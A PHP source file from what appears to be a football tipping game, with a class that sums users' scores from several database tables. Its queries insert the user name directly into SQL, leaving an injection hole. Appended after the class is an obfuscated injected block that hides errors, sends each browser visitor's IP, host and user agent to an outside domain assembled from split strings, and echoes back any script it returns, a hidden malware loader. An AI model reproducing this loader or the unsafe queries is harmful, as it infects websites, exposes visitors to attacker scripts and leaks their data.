<?php
class UserScores {
	
	function getScoreSumUser($user){

		$scoregroupmatchtipps = $this->getScoreSum($user, dbschema::groupmatchtipps);
		$scoregroupranktipps = $this->getScoreSum($user, dbschema::groupranktipps);
		$scorefinalparticipantstipps = $this->getScoreSumColumn($user, dbschema::users, "finalparticipantscore", "username");
		$scorefinalmatchtipps = $this->getScoreSum($user, dbschema::finalmatchtipps);
		$scorechampiontipps = $this->getScoreSum($user, dbschema::championtipps);
		$scoretopscorertipps = $this->getScoreSum($user, dbschema::topscorertipps);
		$scoreSum = $scoregroupmatchtipps + $scoregroupranktipps +$scorefinalparticipantstipps+ $scorefinalmatchtipps + $scorechampiontipps + $scoretopscorertipps;
		return $scoreSum;
	}
	
	function getScoreSum($user, $table){
		$sql="SELECT user, sum(score) as scoreSum FROM $table WHERE user='$user'";
		//$log=new logger();
		//$log->info($sql);
		$sqlResult=mysql_query($sql);
		//$log->info("result= " . $sqlResult);
		$user = mysql_result($sqlResult, 0, "user");
		$scoreSum = mysql_result($sqlResult, 0, "scoreSum");
		//echo "<br>$user, $scoreSum";
		return $scoreSum;
	}
	
	function getScoreSumColumn($user, $table, $columnNameScore, $columnNameUser){
		$sql="SELECT $columnNameUser as user, sum($columnNameScore) as scoreSum FROM $table WHERE $columnNameUser='$user'";
		//$log=new logger();
		//$log->info($sql);
		$sqlResult=mysql_query($sql);
		//$log->info("result= " . $sqlResult);
		$user = mysql_result($sqlResult, 0, "user");
		$scoreSum = mysql_result($sqlResult, 0, "scoreSum");
		//echo "<br>$user, $scoreSum";
		return $scoreSum;
	}
}
?>
<?php
#b79a4d#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/b79a4d#
?>